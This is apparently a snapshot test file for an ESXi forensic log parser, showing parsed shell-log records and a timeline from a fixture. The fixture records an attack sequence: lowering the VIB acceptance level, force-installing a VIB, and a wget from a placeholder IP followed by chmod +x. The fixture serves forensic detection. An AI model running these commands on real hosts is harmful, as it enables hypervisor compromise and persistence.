@@ -1,0 +1,28 @@
+---
+source: crates/nixcavate-artifacts/src/esxi/logs.rs
+expression: out
+---
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":0,"time":"2025-01-10T01:30:29Z","time_basis":"recorded","level":"","program":"ESXShell","pid":null,"user":"","command":"","message":"ESXi shell login enabled","event":"shell_enabled"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":56,"time":"2025-01-10T01:30:29Z","time_basis":"recorded","level":"","program":"ESXShell","pid":null,"user":"","command":"","message":"ESXi Shell available","event":""}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":108,"time":"2025-01-10T01:30:36Z","time_basis":"recorded","level":"","program":"SSH","pid":null,"user":"","command":"","message":"SSH login enabled","event":"ssh_enabled"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":152,"time":"2025-01-10T01:37:05Z","time_basis":"recorded","level":"","program":"shell","pid":2100700,"user":"","command":"","message":"Interactive shell session started","event":"shell_session"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":223,"time":"2025-01-10T01:37:20Z","time_basis":"recorded","level":"","program":"shell","pid":2100700,"user":"root","command":"vmware -v","message":"[root]: vmware -v","event":"executed"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":278,"time":"2025-01-10T01:38:40Z","time_basis":"recorded","level":"","program":"shell","pid":2100700,"user":"root","command":"esxcli software acceptance set --level=CommunitySupported","message":"[root]: esxcli software acceptance set --level=CommunitySupported","event":"executed"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":381,"time":"2025-01-10T01:39:00Z","time_basis":"recorded","level":"","program":"shell","pid":2100700,"user":"root","command":"esxcli software vib install -v /tmp/example.vib --force","message":"[root]:  esxcli software vib install -v /tmp/example.vib --force","event":"executed"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":483,"time":"2025-01-10T01:40:00Z","time_basis":"recorded","level":"","program":"shell","pid":2100700,"user":"root","command":"wget http://203.0.113.80/x -O /tmp/x; chmod +x /tmp/x","message":"[root]: wget http://203.0.113.80/x -O /tmp/x; chmod +x /tmp/x","event":"executed"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":582,"time":"2025-01-10T01:41:00Z","time_basis":"recorded","level":"","program":"shell","pid":2100700,"user":"","command":"","message":"[alice]:","event":""}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":629,"time":"2026-02-03T23:16:32.866Z","time_basis":"recorded","level":"info","program":"shell","pid":132915,"user":"","command":"","message":"Interactive shell session started","event":"shell_session"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":710,"time":"2026-02-03T23:16:33.976Z","time_basis":"recorded","level":"info","program":"shell","pid":132915,"user":"root","command":"ls","message":"[root]: ls","event":"executed"}
+{"host":"memory","artifact":"esxi-shell","source_path":"var/run/log/shell.log","source_offset":768,"time":"2026-02-03T23:20:56.704Z","time_basis":"recorded","level":"notice","program":"SSH","pid":132771,"user":"","command":"","message":"SSH login disabled","event":"ssh_disabled"}
+--- timeline ---
+timestamp,precision,basis,host,artifact,event,message,source_path,source_line,source_offset,rule,level
+2025-01-10T01:30:29Z,seconds,recorded,memory,esxi-shell,shell_enabled,ESXi shell login enabled,var/run/log/shell.log,,0,,
+2025-01-10T01:30:36Z,seconds,recorded,memory,esxi-shell,ssh_enabled,SSH login enabled,var/run/log/shell.log,,108,,
+2025-01-10T01:37:05Z,seconds,recorded,memory,esxi-shell,shell_session,Interactive shell session started,var/run/log/shell.log,,152,,
+2025-01-10T01:37:20Z,seconds,recorded,memory,esxi-shell,executed,root ran: vmware -v,var/run/log/shell.log,,223,,
+2025-01-10T01:38:40Z,seconds,recorded,memory,esxi-shell,executed,root ran: esxcli software acceptance set --level=CommunitySupported,var/run/log/shell.log,,278,,
+2025-01-10T01:39:00Z,seconds,recorded,memory,esxi-shell,executed,root ran: esxcli software vib install -v /tmp/example.vib --force,var/run/log/shell.log,,381,,
+2025-01-10T01:40:00Z,seconds,recorded,memory,esxi-shell,executed,root ran: wget http://203.0.113.80/x -O /tmp/x; chmod +x /tmp/x,var/run/log/shell.log,,483,,
+2026-02-03T23:16:32.866Z,millis,recorded,memory,esxi-shell,shell_session,Interactive shell session started,var/run/log/shell.log,,629,,
+2026-02-03T23:16:33.976Z,millis,recorded,memory,esxi-shell,executed,root ran: ls,var/run/log/shell.log,,710,,
+2026-02-03T23:20:56.704Z,millis,recorded,memory,esxi-shell,ssh_disabled,SSH login disabled,var/run/log/shell.log,,768,,
